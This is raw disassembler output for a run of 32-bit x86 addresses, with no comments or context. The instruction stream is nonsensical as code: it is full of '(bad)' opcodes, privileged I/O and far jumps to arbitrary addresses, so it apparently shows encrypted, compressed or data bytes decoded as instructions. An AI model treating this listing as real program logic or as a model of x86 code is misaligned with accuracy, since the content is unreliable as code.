  41c315:	xlat   BYTE PTR ds:[ebx]
  41c316:	sbb    ch,bh
  41c318:	dec    edi
  41c319:	inc    BYTE PTR [eax-0x62078313]
  41c31f:	ja     0x41c2c8
  41c321:	cmp    esp,ecx
  41c323:	out    0x2f,al
  41c325:	out    dx,al
  41c326:	ror    dh,cl
  41c328:	xor    al,0xa8
  41c32a:	xchg   ebx,eax
  41c32b:	jbe    0x41c2e7
  41c32d:	les    esi,FWORD PTR [edi+0x57562320]
  41c333:	(bad)  
  41c334:	and    al,0x5c
  41c336:	bound  edx,QWORD PTR es:[edi-0x38]
  41c33a:	sub    ebp,eax
  41c33c:	and    al,0x3a
  41c33e:	sub    BYTE PTR [esi+eax*8],cl
  41c341:	xor    BYTE PTR [ebx],ah
  41c343:	xor    BYTE PTR ds:0xe3d10fce,cl
  41c349:	stos   BYTE PTR es:[edi],al
  41c34a:	in     eax,dx
  41c34b:	add    ecx,DWORD PTR [ebx+0x17]
  41c34e:	sbb    BYTE PTR [edx+0x4e],bh
  41c351:	sbb    DWORD PTR [ebp-0x3207c418],ebx
  41c357:	jge    0x41c30d
  41c359:	in     eax,dx
  41c35a:	push   es
  41c35b:	sahf   
  41c35c:	rcr    BYTE PTR [esi+0x3d],cl
  41c35f:	push   esi
  41c360:	xchg   esi,eax
  41c361:	inc    ebp
  41c362:	pop    ebx
  41c363:	pop    eax
  41c364:	inc    ebx
  41c365:	hlt    
  41c366:	repz jb 0x41c32b
  41c369:	retf   0xbca5
  41c36c:	xchg   ebx,eax
  41c36d:	outs   dx,BYTE PTR ds:[esi]
  41c36e:	and    eax,0xe0258d18
  41c373:	add    DWORD PTR ds:0x3970c6de,0xffffffa1
  41c37a:	ds loopne 0x41c3e8
  41c37d:	or     ah,BYTE PTR gs:[esi+0x20]
  41c381:	push   es
  41c382:	adc    ebx,ebx
  41c384:	fnstsw WORD PTR [ebp-0x3d]
  41c387:	(bad)  
  41c388:	adc    BYTE PTR [eax+0x6be0f86e],bh
  41c38e:	aaa    
  41c38f:	pop    edi
  41c390:	cmc    
  41c391:	std    
  41c392:	(bad)  
  41c393:	xchg   ecx,eax
  41c394:	por    mm7,QWORD PTR [ecx+0x28]
  41c398:	in     eax,0xd8
  41c39a:	mov    al,0x92
  41c39c:	(bad)  
  41c39d:	and    dh,BYTE PTR [ebp-0x53b87323]
  41c3a3:	jo     0x41c3b7
  41c3a5:	cmp    ah,BYTE PTR ds:0x37410290
  41c3ab:	jno    0x41c3b1
  41c3ad:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41c3af:	pop    edx
  41c3b0:	dec    ebp
  41c3b1:	cmp    dl,BYTE PTR [ebx-0x69]
  41c3b4:	add    al,0xb
  41c3b6:	or     eax,0xb684c607
  41c3bb:	lea    edx,[edi]
  41c3bd:	ret    0x8ca1
  41c3c0:	sub    eax,0x6e90b034
  41c3c5:	jno    0x41c3a7
  41c3c7:	xchg   esp,eax
  41c3c8:	push   0xc779996
  41c3cd:	jecxz  0x41c3ab
  41c3cf:	pop    ds
  41c3d0:	sub    BYTE PTR [edi-0x65],0x0
  41c3d4:	inc    ecx
  41c3d5:	mov    al,0x7b
  41c3d7:	mov    eax,0x1d10e601
  41c3dc:	fndisi(8087 only) 
  41c3de:	test   al,0x1b
  41c3e0:	mov    ah,0xcf
  41c3e2:	aaa    
  41c3e3:	cmp    edx,DWORD PTR [ebx]
  41c3e5:	(bad)  
  41c3e6:	imul   ebp,DWORD PTR [ecx+0x26337d69],0x50
  41c3ed:	loop   0x41c41e
  41c3ef:	cmp    ah,dl
  41c3f1:	mov    ds:0xa3436271,eax
  41c3f6:	ja     0x41c401
  41c3f8:	xlat   BYTE PTR ds:[ebx]
  41c3f9:	and    BYTE PTR [ecx-0x7f],dh
  41c3fc:	lahf   
  41c3fd:	push   edi
  41c3fe:	js     0x41c3d5
  41c400:	cdq    
  41c401:	or     ebp,eax
  41c403:	push   ss
  41c404:	xchg   ecx,eax
  41c405:	sub    BYTE PTR [esi+edi*1+0x67499b8],cl
  41c40c:	mov    ah,0xa3
  41c40e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c410:	dec    edi
  41c411:	push   ds
  41c412:	popa   
  41c413:	adc    DWORD PTR ds:0xf72dfbb,edi
  41c419:	push   0x9269ec68
  41c41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c41f:	pop    esp
  41c420:	push   ebp
  41c421:	arpl   di,bx
  41c423:	jge    0x41c455
  41c425:	ret    
  41c426:	jne    0x41c3e3
  41c428:	mov    dl,0xed
  41c42a:	inc    ecx
  41c42b:	dec    esp
  41c42c:	push   edx
  41c42d:	bound  edi,QWORD PTR [ecx]
  41c42f:	jl     0x41c3b4
  41c431:	in     eax,dx
  41c432:	hlt    
  41c433:	loope  0x41c45e
  41c435:	ins    DWORD PTR es:[edi],dx
  41c436:	mov    dh,0x4f
  41c438:	pop    esi
  41c439:	fidiv  WORD PTR [ecx+0x13eccd5]
  41c43f:	fcmovnu st,st(4)
  41c441:	adc    esi,DWORD PTR [ebx]
  41c443:	aas    
  41c444:	pushf  
  41c445:	jnp    0x41c46b
  41c447:	fidivr DWORD PTR [ebp+0x70]
  41c44a:	or     esp,DWORD PTR [esi-0x6e5ee528]
  41c450:	jl     0x41c410
  41c452:	inc    ecx
  41c453:	lahf   
  41c454:	pop    edi
  41c455:	inc    edi
  41c456:	mov    bl,0xf4
  41c458:	aas    
  41c459:	pop    esp
  41c45a:	adc    eax,0xa3a7a7c5
  41c45f:	jmp    0xfb8a:0xc31955e0
  41c466:	es nop
  41c468:	daa    
  41c469:	jne    0x41c3eb
  41c46b:	add    eax,0x13756949
  41c470:	cmp    edi,eax
  41c472:	jmp    0xf71c5e2e
  41c477:	shl    DWORD PTR [edi+0x6070929e],cl
  41c47d:	mov    ds:0x8921dec3,al
  41c482:	loope  0x41c49d
  41c484:	pop    eax
  41c485:	loope  0x41c4f6
  41c487:	inc    ebx
  41c488:	or     esp,edx
  41c48a:	shr    DWORD PTR [edx+0xc],1
  41c48d:	push   ecx
  41c48e:	mov    DWORD PTR [edx],ebx
  41c490:	add    eax,0x462b923c
  41c495:	shr    esi,0xa9
  41c498:	iret   
  41c499:	stc    
  41c49a:	clc    
  41c49b:	cmp    eax,0x534e1b54
  41c4a0:	jl     0x41c454
  41c4a2:	into   
  41c4a3:	scas   al,BYTE PTR es:[edi]
  41c4a4:	push   edx
  41c4a5:	mov    DWORD PTR [ebx+0x5f],esp
  41c4a8:	js     0x41c503
  41c4aa:	test   DWORD PTR [edx-0x4c],eax
  41c4ad:	std    
  41c4ae:	sbb    ch,BYTE PTR ds:[esi]
  41c4b1:	or     al,0x6f
  41c4b3:	or     BYTE PTR [esi-0x2c],0x36
  41c4b7:	sub    al,0xcd
  41c4b9:	sbb    cl,BYTE PTR [eiz*2-0x1beba4f7]
  41c4c0:	sbb    DWORD PTR [ebp-0x14],ebx
  41c4c3:	hlt    
  41c4c4:	lods   al,BYTE PTR ds:[esi]
  41c4c5:	cwde   
  41c4c6:	jnp    0x41c4cf
  41c4c8:	lahf   
  41c4c9:	(bad)  
  41c4ca:	nop
  41c4cb:	push   edx
  41c4cc:	push   ds
  41c4cd:	cmc    
  41c4ce:	xlat   BYTE PTR ds:[ebx]
  41c4cf:	scas   eax,DWORD PTR es:[edi]
  41c4d0:	inc    esi
  41c4d1:	inc    BYTE PTR [edx+0x78ef721c]
  41c4d7:	adc    esi,DWORD PTR [ebp-0x44263d2d]
  41c4dd:	sub    BYTE PTR [edx+edx*1-0x20a976d0],ah
  41c4e4:	cmp    dl,0x5
  41c4e7:	add    al,0xf0
  41c4e9:	dec    ebx
  41c4ea:	inc    ebp
  41c4eb:	push   ebx
  41c4ec:	sub    dh,cl
  41c4ee:	sti    
  41c4ef:	jae    0x41c54e
  41c4f1:	into   
  41c4f2:	mov    bl,0x85
  41c4f4:	nop
  41c4f5:	inc    ebx
  41c4f6:	xor    DWORD PTR [edi+0x15abd6ed],0xe7001784
  41c500:	test   DWORD PTR ds:0x38dfa07c,0x446a4382
  41c50a:	aad    0xd4
  41c50c:	xchg   ebp,eax
  41c50d:	cmp    DWORD PTR [esi],ebp
  41c50f:	arpl   WORD PTR [esi],si
  41c511:	pusha  
  41c512:	add    BYTE PTR [ecx+0x5f],ah
  41c515:	rol    BYTE PTR fs:0xa33d73d,0x4b
  41c51d:	add    BYTE PTR [edx-0xa],0x34
  41c521:	add    al,0xca
  41c523:	call   0xc59a:0xde188df6
  41c52a:	dec    eax
  41c52b:	les    ebx,FWORD PTR [ebx-0x73]
  41c52e:	add    ebx,ebp
  41c530:	mov    ds,WORD PTR [esi+ebx*8-0x7fbff5fd]
  41c537:	out    dx,al
  41c538:	lods   al,BYTE PTR ds:[esi]
  41c539:	lea    ecx,[ebx-0xc9e68b6]
  41c53f:	rcr    ch,1
  41c541:	push   ss
  41c542:	adc    ecx,DWORD PTR [eax-0x220e2f7a]
  41c548:	or     BYTE PTR ds:0x78625e54,dh
  41c54e:	sbb    BYTE PTR [ebp-0x80],cl
  41c551:	loopne 0x41c5c9
  41c553:	inc    edi
  41c554:	loopne 0x41c56f
  41c556:	popf   
  41c557:	or     BYTE PTR [edx-0x39],0xf2
  41c55b:	jo     0x41c5a5
  41c55d:	mov    bh,cl
  41c55f:	out    0xa2,eax
  41c561:	cmp    eax,0xec98f1cd
  41c566:	(bad)  
  41c568:	rcr    ebp,0x91
  41c56b:	dec    ebx
  41c56c:	cmp    BYTE PTR [esi],bl
  41c56e:	jno    0x41c542
  41c570:	or     al,0xb
  41c572:	dec    esi
  41c573:	pusha  
  41c574:	imul   eax,DWORD PTR [ebx+ecx*1],0xf76b4907
  41c57b:	pop    es
  41c57c:	jecxz  0x41c551
  41c57e:	shl    DWORD PTR [edi-0x6e0ce560],cl
  41c584:	cli    
  41c585:	or     DWORD PTR [ebx-0x56],ebx
  41c588:	pop    ds
  41c589:	nop
  41c58a:	mov    esi,0xf1a10ea8
  41c58f:	jne    0x41c5eb
  41c591:	add    ebx,ebp
  41c593:	aaa    
  41c594:	in     eax,dx
  41c595:	or     ch,BYTE PTR [edi+eax*2]
  41c598:	xor    eax,0xd6a2fe6c
  41c59d:	idiv   BYTE PTR [esi-0x6d]
  41c5a0:	push   esi
  41c5a1:	stc    
  41c5a2:	jecxz  0x41c5c6
  41c5a4:	es or  eax,0xd418f8c6
  41c5aa:	ret    
  41c5ab:	movzx  esp,al
  41c5ae:	push   ebx
  41c5af:	add    DWORD PTR [eax+0x2de8394f],edi
  41c5b5:	push   es
  41c5b6:	dec    edx
  41c5b7:	rol    cl,0x3c
  41c5ba:	ds ds mov edx,0xb7c1245d
  41c5c1:	dec    edx
  41c5c2:	jp     0x41c635
  41c5c4:	mov    ds:0xb6f405af,al
  41c5c9:	mov    ds:0x6d1b8c1a,eax
  41c5ce:	jae    0x41c5bc
  41c5d0:	sti    
  41c5d1:	jle    0x41c614
  41c5d3:	imul   esi,esp,0xffffffe7
  41c5d6:	pop    ds
  41c5d7:	sbb    ebp,esi
  41c5d9:	push   ebp
  41c5da:	scas   eax,DWORD PTR es:[edi]
  41c5db:	je     0x41c605
  41c5dd:	xor    BYTE PTR [ecx-0x3a2b3679],bl
  41c5e3:	xchg   edx,eax
  41c5e4:	ror    ch,1
  41c5e6:	xor    al,0xb5
  41c5e8:	adc    dh,BYTE PTR [ecx-0x53534b2b]
  41c5ee:	add    ch,BYTE PTR [eax-0x3062fe9c]
  41c5f4:	ins    BYTE PTR es:[edi],dx
  41c5f5:	retf   
  41c5f6:	icebp  
  41c5f7:	cmp    eax,0xe9421326
  41c5fc:	jmp    0xead707eb
  41c601:	xlat   BYTE PTR ds:[ebx]
  41c602:	rcr    DWORD PTR [esi+0x69],0x64
  41c606:	pop    ecx
  41c607:	cs mov cl,ch
  41c60a:	jnp    0x41c5f0
  41c60c:	pop    edx
  41c60d:	mov    al,ds:0x550017c9
  41c612:	psllq  mm0,QWORD PTR [ebx+0x3cf0091b]
  41c619:	scas   al,BYTE PTR es:[edi]
  41c61a:	pusha  
  41c61b:	sbb    eax,0x6aaee100
  41c620:	pushf  
  41c621:	add    al,0xd7
  41c623:	cmp    edx,DWORD PTR ds:0xfd7a1cdc
  41c629:	sbb    eax,0x1863db58
  41c62e:	xor    DWORD PTR [esi-0x56fc9ebc],ebx
  41c634:	das    
  41c635:	mov    ch,0x5
  41c637:	mov    ch,0x21
  41c639:	fimul  WORD PTR [ecx+0x5b]
  41c63c:	push   cs
  41c63d:	nop
  41c63e:	pop    ds
  41c63f:	int    0xaf
  41c641:	inc    edx
  41c642:	push   ebp
  41c643:	stos   DWORD PTR es:[edi],eax
  41c644:	stc    
  41c645:	sar    BYTE PTR [edx+eax*4],cl
  41c648:	pop    ss
  41c649:	aaa    
  41c64a:	mov    dl,0x95
  41c64c:	mov    dl,dl
  41c64e:	cmp    al,0x95
  41c650:	adc    bl,BYTE PTR [ecx+eax*1+0x446c0d6b]
  41c657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c658:	out    dx,al
  41c659:	cs pushf 
  41c65b:	mov    edi,0x4882878e
  41c660:	mov    dh,0xed
  41c662:	inc    ecx
  41c663:	jae    0x41c604
  41c665:	add    DWORD PTR [edi-0x64],edx
  41c668:	adc    cl,BYTE PTR [edx+0x5d]
  41c66b:	inc    ecx
  41c66c:	cmp    BYTE PTR [ecx],ch
  41c66e:	pop    ebx
  41c66f:	daa    
  41c670:	or     eax,0x3cf0ffee
  41c675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c676:	and    al,0x25
  41c678:	sar    ch,0x66
  41c67b:	shr    DWORD PTR [esp+eax*1-0x13],cl
  41c67f:	js     0x41c654
  41c681:	xchg   esi,eax
  41c682:	jmp    0x7f67:0x50891bf7
  41c689:	ins    BYTE PTR es:[edi],dx
  41c68a:	mov    ch,0xcb
  41c68c:	mov    ds:0x189ba361,al
  41c691:	in     al,dx
  41c692:	ins    BYTE PTR es:[edi],dx
  41c693:	sbb    DWORD PTR [ebx],edx
  41c695:	jmp    0x41c634
  41c697:	adc    ebp,edx
  41c699:	cwde   
  41c69a:	hlt    
  41c69b:	xor    DWORD PTR [eax-0x44a04755],edx
  41c6a1:	mov    esp,0x1f1b6784
  41c6a6:	cmc    
  41c6a7:	test   eax,0xab7483
  41c6ac:	lock inc ecx
  41c6ae:	xor    eax,0xe0f3f5a8
  41c6b3:	jae    0x41c6fe
  41c6b5:	lahf   
  41c6b6:	dec    esp
  41c6b7:	sbb    eax,0x9e4e576b
  41c6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6bd:	out    dx,al
  41c6be:	lock inc esp
  41c6c0:	mov    ecx,0xa7d5d375
  41c6c5:	xchg   BYTE PTR [ecx],bl
  41c6c7:	mov    WORD PTR [edx],?
  41c6c9:	and    cl,cl
  41c6cb:	js     0x41c6c6
  41c6cd:	ins    DWORD PTR es:[edi],dx
  41c6ce:	(bad)  
  41c6cf:	ins    BYTE PTR es:[edi],dx
  41c6d0:	xor    al,0xbe
  41c6d2:	inc    edx
  41c6d3:	out    0x7b,al
  41c6d5:	pop    es
  41c6d6:	cmp    ecx,ebp
  41c6d8:	adc    DWORD PTR [ebx+edi*8],ecx
  41c6db:	cmp    ecx,DWORD PTR [edi]
  41c6dd:	xor    ebx,ecx
  41c6df:	ror    bl,cl
  41c6e1:	sbb    ebp,eax
  41c6e3:	dec    edi
  41c6e4:	push   esp
  41c6e5:	sbb    cl,0x84
  41c6e8:	sbb    bh,bl
  41c6ea:	jno    0x41c670
  41c6ec:	cmp    ecx,ebp
  41c6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6ef:	dec    ebx
  41c6f0:	mov    esi,0xd7414c0c
  41c6f5:	dec    esp
  41c6f6:	pop    edi
  41c6f7:	push   ecx
  41c6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f9:	sbb    edx,DWORD PTR [ebp-0x61]
  41c6fc:	lods   eax,DWORD PTR ds:[esi]
  41c6fd:	mov    ecx,0x8416c282
  41c702:	sbb    al,0xc6
  41c704:	fcomi  st,st(6)
  41c706:	mov    ecx,0x1138fad
  41c70b:	mov    dl,0x19
  41c70d:	pop    ebx
  41c70e:	ja     0x41c740
  41c710:	inc    eax
  41c711:	xchg   esi,eax
  41c712:	pop    ebx
  41c713:	pop    ebx
  41c714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c715:	jo     0x41c795
  41c717:	(bad)  
  41c719:	repnz adc eax,0x87e0dbfc
  41c71f:	fcom   DWORD PTR [edi]
  41c721:	int    0xa7
  41c723:	leave  
  41c724:	test   eax,0x6b99ed06
  41c729:	dec    ebx
  41c72a:	push   edi
  41c72b:	sub    al,0x79
  41c72d:	inc    ebx
  41c72e:	mov    ds:0x1dfccf38,eax
  41c733:	and    BYTE PTR [edx+0x1539c3e9],ah
  41c739:	xchg   DWORD PTR [ecx-0x38],ebp
  41c73c:	or     edx,DWORD PTR [ebx+0x4461c013]
  41c742:	fs xchg ebx,eax
  41c744:	scas   eax,DWORD PTR es:[edi]
  41c745:	mov    al,0x9a
  41c747:	mov    gs,edi
  41c749:	dec    esp
  41c74a:	loop   0x41c6e5
  41c74c:	inc    esi
  41c74d:	(bad)  
  41c74f:	jns    0x41c74a
  41c751:	sub    ebx,esp
  41c753:	mov    eax,0xe31cb3a7
  41c758:	inc    esi
  41c759:	pop    ds
  41c75a:	sbb    eax,0xcf0770d8
  41c75f:	sbb    ecx,esi
  41c761:	dec    edx
  41c762:	sub    DWORD PTR [esi+0x5d],0xbed2f4cc
  41c769:	imul   DWORD PTR [edx]
  41c76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c76c:	push   esp
  41c76d:	pushf  
  41c76e:	adc    BYTE PTR [edi+ebx*8],0xdf
  41c772:	jae    0x41c73d
  41c774:	pushf  
  41c775:	std    
  41c776:	xchg   esp,eax
  41c777:	(bad)  
  41c778:	jns    0x41c74c
  41c77a:	lods   al,BYTE PTR ds:[esi]
  41c77b:	mov    eax,ds:0xfe8776a9
  41c780:	sub    eax,0x18b9552
  41c785:	out    0x55,eax
  41c787:	dec    ebx
  41c788:	dec    esp
  41c789:	lea    esp,[esi-0x48788869]
  41c78f:	xchg   ecx,eax
  41c790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c791:	sub    al,BYTE PTR [edx+0x675de40b]
  41c797:	mov    esi,ebp
  41c799:	stos   DWORD PTR es:[edi],eax
  41c79a:	rcr    ecx,0xd9
  41c79d:	fstp   DWORD PTR [ecx+0x16e7cdcc]
  41c7a3:	and    DWORD PTR [edx-0xa3d57af],0x15
  41c7aa:	xor    edi,DWORD PTR [esi-0x24]
  41c7ad:	cmp    DWORD PTR [ebx+0x6f],0x1c4edd58
  41c7b4:	fsub   st(2),st
  41c7b6:	test   eax,0x5a3ece81
  41c7bb:	sbb    eax,0xcfa8810a
  41c7c0:	adc    ecx,esp
  41c7c2:	and    eax,0x8ad4afa0
  41c7c7:	sub    ecx,0x5e69b1d5
  41c7cd:	and    BYTE PTR [ebp-0x60],ah
  41c7d0:	and    al,BYTE PTR [ebx+0x22]
  41c7d3:	arpl   WORD PTR [ecx-0x3fa96c3d],sp
  41c7d9:	mov    eax,0x8ffc081c
  41c7de:	sar    bl,0x5f
  41c7e1:	push   ecx
  41c7e2:	in     al,0x8c
  41c7e4:	in     eax,0x69
  41c7e6:	sbb    bl,BYTE PTR [esi-0x38d2c3c8]
  41c7ec:	xchg   edi,eax
  41c7ed:	or     al,0x41
  41c7ef:	dec    esp
  41c7f0:	inc    edx
  41c7f1:	mov    ah,0xf1
  41c7f3:	sbb    BYTE PTR [edx+0x93bd461],dh
  41c7f9:	(bad)  
  41c7fa:	into   
  41c7fb:	out    0xd6,eax
  41c7fd:	or     al,BYTE PTR [esi-0x27672533]
  41c803:	or     DWORD PTR [ebp-0x7b],esi
  41c806:	idiv   DWORD PTR [ecx+0x7a]
  41c809:	inc    esp
  41c80a:	lds    ebx,FWORD PTR [edx]
  41c80c:	addr16 push cs
  41c80e:	repz scas eax,DWORD PTR es:[edi]
  41c810:	aad    0x92
  41c812:	xchg   ecx,eax
  41c813:	je     0x41c7d0
  41c815:	pop    ss
  41c816:	cmp    al,BYTE PTR [edx+0x4a]
  41c819:	pop    esi
  41c81a:	mov    edx,0xac88f0dc
  41c81f:	add    DWORD PTR [ebx+0xaa98300],ebp
  41c825:	std    
  41c826:	nop
  41c827:	pushf  
  41c828:	fldlg2 
  41c82a:	mov    dl,0x21
  41c82c:	jne    0x41c7e5
  41c82e:	pop    ebx
  41c82f:	int    0x68
  41c831:	das    
  41c832:	ss dec edx
  41c834:	cmp    edx,0x64
  41c837:	fwait
  41c838:	dec    ebx
  41c839:	or     esi,DWORD PTR [edx-0x1c]
  41c83c:	or     DWORD PTR [edx+edi*8-0x36],ebx
  41c840:	fist   DWORD PTR [eax+0x6f9f34cf]
  41c846:	push   esp
  41c847:	pop    ebp
  41c848:	and    esi,DWORD PTR [esi+0x35]
  41c84b:	mov    ds:0x183739da,eax
  41c850:	lods   eax,DWORD PTR ds:[si]
  41c852:	stc    
  41c853:	ret    
  41c854:	push   es
  41c855:	ja     0x41c8a9
  41c857:	mov    bh,0x87
  41c859:	idiv   BYTE PTR [esi-0x59]
  41c85c:	retf   0xabed
  41c85f:	loop   0x41c896
  41c861:	dec    edi
  41c862:	push   cs
  41c863:	mov    DWORD PTR [ebp+ebx*2+0x3c06c9cd],edx
  41c86a:	ins    DWORD PTR es:[edi],dx
  41c86b:	cld    
  41c86c:	leave  
  41c86d:	nop
  41c86e:	pop    esi
  41c86f:	mov    ecx,esp
  41c871:	ins    DWORD PTR es:[edi],dx
  41c872:	dec    esp
  41c873:	inc    ebp
  41c874:	mov    ?,WORD PTR [edx]
  41c876:	xor    al,0x6f
  41c878:	popa   
  41c879:	in     al,0xeb
  41c87b:	push   ebx
  41c87c:	test   al,0xae
  41c87e:	or     DWORD PTR [edi+0x3a272a75],esp
  41c884:	imul   DWORD PTR [edi-0x30973d40]
  41c88a:	mov    ebp,ss
  41c88c:	and    al,0xc0
  41c88e:	leave  
  41c88f:	repz pop ecx
  41c891:	fidiv  DWORD PTR gs:[esi+0x2f6e70af]
  41c898:	mov    DWORD PTR [eax+0xf],ebp
  41c89b:	iret   
  41c89c:	jge    0x41c895
  41c89e:	mov    ds:0x56bdb716,al
  41c8a3:	call   0xd8fc419a
  41c8a8:	lock mov bl,ah
  41c8ab:	repnz xchg edi,eax
  41c8ad:	pop    ds
  41c8ae:	and    eax,DWORD PTR [ebx-0x5e]
  41c8b1:	sub    BYTE PTR [edx+0x3],0xa1
  41c8b5:	lea    edx,[esp+ebx*2+0x59]
  41c8b9:	es mov ebx,0xc7deee0c
  41c8bf:	xor    al,0xdf
  41c8c1:	andnps xmm7,XMMWORD PTR [ebx-0x62]
  41c8c5:	fld    DWORD PTR [edi+0x6d]
  41c8c8:	adc    DWORD PTR [edx+0x63495bb],esp
  41c8ce:	push   ebx
  41c8cf:	dec    ecx
  41c8d0:	mul    DWORD PTR [ecx]
  41c8d2:	icebp  
  41c8d3:	mov    dh,0xdb
  41c8d5:	(bad)  
  41c8d6:	mov    esp,0xeb3ed2b2
  41c8db:	push   ss
  41c8dc:	mov    ds:0x7f6e0db0,al
  41c8e1:	adc    DWORD PTR [eax+edi*4],ebp
  41c8e4:	in     eax,dx
  41c8e5:	pop    ebx
  41c8e6:	or     BYTE PTR [edi+esi*1-0x29],0xf8
  41c8eb:	pop    ecx
  41c8ec:	jle    0x41c899
  41c8ee:	fist   WORD PTR [ebx-0xf032121]
  41c8f4:	xchg   BYTE PTR [ecx+eax*8],cl
  41c8f7:	(bad)  
  41c8f8:	test   eax,0x623a9e22
  41c8fd:	cmp    DWORD PTR [edi-0x51],esi
  41c900:	clc    
  41c901:	and    ebx,DWORD PTR [esi]
  41c903:	lods   eax,DWORD PTR ds:[esi]
  41c904:	and    DWORD PTR [ebx],0x4ff696a4
  41c90a:	mov    esi,0x3649058
  41c90f:	fstp   TBYTE PTR [eax]
  41c911:	inc    esi
  41c912:	fwait
  41c913:	sub    ecx,DWORD PTR [ebx-0xb12486f]
  41c919:	mov    ch,BYTE PTR [ecx]
  41c91b:	add    eax,0xee0df9a3
  41c920:	dec    ecx
  41c921:	(bad)  
  41c922:	gs dec esp
  41c924:	out    dx,eax
  41c925:	fcom   QWORD PTR [ecx]
  41c927:	jnp    0x41c8ba
  41c929:	xchg   BYTE PTR [edx+0x1a],bh
  41c92c:	mov    eax,ds:0xbafc62f2
  41c931:	pusha  
  41c932:	dec    ebx
  41c933:	and    eax,0xc9615b5c
  41c938:	rcl    BYTE PTR [edx],0x92
  41c93b:	shr    BYTE PTR [eax+0x1a797f59],0xdd
  41c942:	hlt    
  41c943:	ret    
  41c944:	dec    eax
  41c945:	and    al,0x91
  41c947:	inc    ecx
  41c948:	xor    eax,0x94260ef
  41c94d:	mov    ebp,0x4f4e4126
  41c952:	lahf   
  41c953:	push   cs
  41c954:	mov    DWORD PTR [ebx-0x50bb9faf],edx
  41c95a:	inc    edi
  41c95b:	inc    eax
  41c95c:	ss test al,0x49
  41c95f:	arpl   dx,sp
  41c961:	in     al,dx
  41c962:	fidiv  WORD PTR [edx-0x66d3cfba]
  41c968:	jmp    0x41c96f
  41c96a:	or     BYTE PTR [edi-0x33],cl
  41c96d:	ss xor eax,0xbf61f195
  41c973:	dec    ebx
  41c974:	dec    eax
  41c975:	test   al,0xb2
  41c977:	mov    ds,ebx
  41c979:	int3   
  41c97a:	bnd jns 0x41c953
  41c97d:	shl    DWORD PTR [eax],cl
  41c97f:	push   es
  41c980:	pop    ds
  41c981:	jl     0x41c9b3
  41c983:	pop    esp
  41c984:	xchg   dh,ch
  41c986:	push   cs
  41c987:	sbb    DWORD PTR [esi+0x11],edi
  41c98a:	loopne 0x41c992
  41c98c:	mov    DWORD PTR [esi],ecx
  41c98e:	rcr    DWORD PTR [edx+0x1627660d],1
  41c994:	jle    0x41c98e
  41c996:	inc    edx
  41c997:	add    bl,BYTE PTR [edx+ebx*8+0x74]
  41c99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c99c:	mov    edi,0x35c94440
  41c9a1:	jne    0x41ca0f
  41c9a3:	je     0x41c9b8
  41c9a5:	es enter 0xf486,0xc7
  41c9aa:	and    edi,esi
  41c9ac:	mov    dl,0xaf
  41c9ae:	adc    eax,0x3ea645c2
  41c9b3:	ret    
  41c9b4:	in     al,0x91
  41c9b6:	push   edx
  41c9b7:	jne    0x41ca23
  41c9b9:	xchg   ecx,eax
  41c9ba:	adc    al,dl
  41c9bc:	xchg   esi,eax
  41c9bd:	pop    ebx
  41c9be:	cmc    
  41c9bf:	xchg   BYTE PTR [edi],dl
  41c9c1:	js     0x41c9fa
  41c9c3:	nop
  41c9c4:	ss (bad) 
  41c9c6:	fistp  WORD PTR [ebp+0x7f]
  41c9c9:	ret    
  41c9ca:	inc    esp
  41c9cb:	jecxz  0x41c9c4
  41c9cd:	xor    al,0xc3
  41c9cf:	dec    esi
  41c9d0:	and    DWORD PTR [ecx-0x44],0x589ceb4f
  41c9d7:	pop    es
  41c9d8:	fdiv   DWORD PTR [eax-0x1c]
  41c9db:	jnp    0x41ca35
  41c9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9de:	rol    BYTE PTR [edi-0x69388d9c],cl
  41c9e4:	push   eax
  41c9e5:	or     BYTE PTR [ebx-0x24d6ba4d],dh
  41c9eb:	lahf   
  41c9ec:	cwde   
  41c9ed:	fld    TBYTE PTR [edx]
  41c9ef:	mov    al,0x6
  41c9f1:	inc    esp
  41c9f2:	ins    DWORD PTR es:[edi],dx
  41c9f3:	xchg   edx,eax
  41c9f4:	std    
  41c9f5:	into   
  41c9f6:	dec    ecx
  41c9f7:	sbb    ah,BYTE PTR [eax+0x562cdae2]
  41c9fd:	(bad)  
  41c9fe:	push   ebx
  41c9ff:	dec    ebp
  41ca00:	ja     0x41ca76
  41ca02:	push   ecx
  41ca03:	test   DWORD PTR [ecx],esi
  41ca05:	sub    DWORD PTR [eax],0xc0c4c6f3
  41ca0b:	xor    eax,0x47381f56
  41ca10:	sahf   
  41ca11:	push   edx
  41ca12:	loop   0x41c9ba
  41ca14:	stos   DWORD PTR es:[edi],eax
  41ca15:	push   ecx
  41ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca17:	or     BYTE PTR [eax+edi*8],ch
  41ca1a:	in     al,dx
  41ca1b:	fsub   QWORD PTR [eax]
  41ca1d:	ds inc edx
  41ca1f:	mov    ch,0x2b
  41ca21:	xchg   ebp,eax
  41ca22:	pop    ecx
  41ca23:	fstp   DWORD PTR [ecx+0x2e]
  41ca26:	icebp  
  41ca27:	mov    ch,0x39
  41ca29:	adc    DWORD PTR [edx+0x3b3eab5d],0x762a0df
  41ca33:	hlt    
  41ca34:	jb     0x41c9e4
  41ca36:	push   ds
  41ca37:	push   ecx
  41ca38:	popa   
  41ca39:	jbe    0x41ca70
  41ca3b:	sar    dh,0x0
  41ca3e:	cmp    dh,BYTE PTR [ecx+0x37]
  41ca41:	cli    
  41ca42:	inc    ecx
  41ca43:	sbb    eax,0xe802af72
  41ca48:	or     al,BYTE PTR [ebx+edx*4-0x5cbf3a97]
  41ca4f:	cmp    DWORD PTR [ebp+0x38],esi
  41ca52:	mov    dh,0x2d
  41ca54:	push   0xffffffc5
  41ca56:	or     dl,dl
  41ca58:	cld    
  41ca59:	cmp    ebx,ecx
  41ca5b:	ja     0x41ca3d
